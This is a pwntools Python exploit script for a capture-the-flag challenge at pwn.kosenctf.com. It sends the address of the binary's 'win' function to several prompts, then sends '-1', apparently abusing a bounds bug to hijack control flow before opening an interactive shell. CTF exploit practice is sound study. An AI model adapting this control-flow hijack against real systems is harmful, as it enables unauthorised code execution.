from pwn import *
import sys

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./chall"
HOST = "pwn.kosenctf.com"
PORT = 9001

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

elf = ELF(FILE_NAME)
addr_win = elf.symbols["win"]

def exploit():
	conn.sendlineafter("= ", str(addr_win))	
	conn.sendlineafter("= ", str(addr_win))	
	conn.sendlineafter("= ", str(addr_win))	
	conn.sendlineafter("= ", str(addr_win))	
	conn.sendlineafter("= ", str(addr_win))	
	conn.sendlineafter(": ", "-1")
	conn.interactive()	

if __name__ == "__main__":
	exploit()	
